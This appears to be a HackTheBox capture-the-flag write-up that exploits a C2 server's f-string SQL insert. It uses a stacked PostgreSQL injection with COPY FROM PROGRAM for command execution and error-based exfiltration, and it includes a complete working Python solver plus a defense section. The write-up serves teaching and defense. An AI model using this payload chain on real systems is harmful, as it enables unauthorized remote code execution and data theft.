---
layout: post
title: "Debugger Unchained"
date: 2027-08-13 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, sql-injection, postgresql, rce, error-based, c2, CWE-89]
---

## Overview

**Debugger Unchained** is an Easy HackTheBox **Web** challenge with a twist: there is no normal web app to attack — you're handed a packet capture of a custom HTTP C2 beacon plus the malleable `c2.profile` it used, and told to *hack the C2 server back*. The teamserver that ingests beacon output builds its `INSERT` with a Python f-string, so the implant's own data is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html). We turn the C2's ingest endpoint into command execution with PostgreSQL's `COPY ... FROM PROGRAM` and read the flag back through the error-based channel its debug page kindly reflects.

## The technique

The capture shows a beacon talking to `POST /assets/jquery-3.6.0.slim.min.js`. Output is smuggled in a cookie:

```
__cfuid = base64( {"id": <task_id>, "output": "<base64 cmd output>"} )
__cflb  = <session UUID>
```

Decoding every `__cfuid` from the pcap reveals ordinary Windows recon (`whoami /all`, `ipconfig`, `netstat`, `net share`) — but the interesting target is the *server* receiving it. Two facts make it exploitable:

1. **A User-Agent gate.** The ingest route only fires when the request `User-Agent` equals `BOT_CONFIG['user_agent']` from the `c2.profile`. Every request must carry that exact string.
2. **A debug-mode information leak.** Sending a malformed cookie value (`__cfuid==`, which is invalid base64/JSON) throws a `JSONDecodeError`, and because the Flask app runs with `debug=True`, a full **Werkzeug traceback** is returned — leaking the vulnerable source:

```python
db.execute(f"""INSERT INTO task_outputs(output, task_id) VALUES ('{output}', {id})""")
db.execute(f"""UPDATE tasks SET received = CURRENT_TIMESTAMP WHERE id={id};""")
```

Both `output` (single-quote string context) and `id` (bare numeric) are f-string-interpolated = [SQL injection](https://cwe.mitre.org/data/definitions/89.html). The backend is PostgreSQL via psycopg2, which executes multiple `;`-separated statements in a single `execute()` — i.e. **stacked queries**. The debugger console is disabled (`EVALEX=false`), so there's no code-eval shortcut; it has to be SQLi.

## Solution

`task_outputs(output, task_id)` names **two** columns, so the breakout row must supply both values or PostgreSQL raises `more target columns than expressions` *before* the stacked payload runs. Injecting through the `output` field, the chain is:

```sql
x', <random_task_id>);              -- close VALUES with a valid 2-column row
DROP TABLE IF EXISTS cx;
CREATE TABLE cx(o text);
COPY cx FROM PROGRAM '/readflag';    -- RCE: PG superuser runs the binary, stdout -> cx
SELECT CAST((SELECT string_agg(o, chr(10)) FROM cx) AS int)-- -
```

- `COPY ... FROM PROGRAM` runs `/readflag` (a setuid helper on the box) and stores its stdout in the scratch table. It requires the DB role be a PostgreSQL superuser — the default in many app stacks.
- With **no SELECT return channel**, we exfiltrate in-band by `CAST`-ing the captured text to `int`. PostgreSQL throws `invalid input syntax for integer: "HTB{...}"`, and that error is reflected straight onto the debug page.
- A **random `task_id`** each run dodges the `task_outputs_task_id_key` UNIQUE-constraint collision that would otherwise abort the whole batch.

The working solver builds the base64 cookie, fires one POST with the profile's User-Agent, and regexes the flag out of the integer-cast error (remember to HTML-unescape `&amp;` → `&`):

```python
#!/usr/bin/env python3
import sys, base64, json, re, random
import requests

TARGET = sys.argv[1]
URL = f"http://{TARGET}/assets/jquery-3.6.0.slim.min.js"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 "
      "Edge/44.18363.1337")
UUID = "49f062b5-8b94-4fff-bb41-d504b148aa1b"

def beacon(output_payload, idval=0):
    j = {"id": idval, "output": output_payload}
    cfuid = base64.b64encode(json.dumps(j).encode()).decode()
    cookies = {"__cflb": UUID, "__cfuid": cfuid}
    return requests.post(URL, headers={"User-Agent": UA}, cookies=cookies, timeout=30)

def run(cmd):
    tid = random.randint(100000, 999999)
    sql_cmd = cmd.replace("'", "''")
    payload = (
        f"x', {tid}); "
        f"DROP TABLE IF EXISTS cx; "
        f"CREATE TABLE cx(o text); "
        f"COPY cx FROM PROGRAM '{sql_cmd}'; "
        f"SELECT CAST((SELECT string_agg(o, chr(10)) FROM cx) AS int)-- -"
    )
    body = beacon(payload).text
    m = re.search(r'invalid input syntax for [a-z ]*integer:\s*&quot;(.*?)&quot;', body, re.S)
    return m.group(1) if m else None

out = run("/readflag")
print("RESULT:", out)
fm = re.search(r'HTB\{[^}]*\}', out or "")
print("FLAG:", fm.group(0) if fm else "<none>")
```

Running it against the live instance yields the flag:

```
FLAG: HTB{...}
```

## Why it worked

The defenders' tooling trusted data coming from *its own implants*. But an implant is fully attacker-controllable, and a real adversary will happily send hostile "output." Combine an f-string-built SQL statement, a PostgreSQL superuser, `COPY FROM PROGRAM`, and a production Flask debugger, and the C2 ingest endpoint becomes unauthenticated RCE on the teamserver.

## Fix / defense

- **Parameterize every query:** `db.execute("INSERT INTO task_outputs(output, task_id) VALUES (%s, %s)", (output, int(id)))`.
- Run PostgreSQL as a **non-superuser** so `COPY ... FROM PROGRAM` is denied.
- **Never** ship Flask `debug=True` / the Werkzeug debugger to production — return generic 500s.
- Treat all implant traffic as untrusted input; validate that `id` is an integer before it ever reaches SQL.
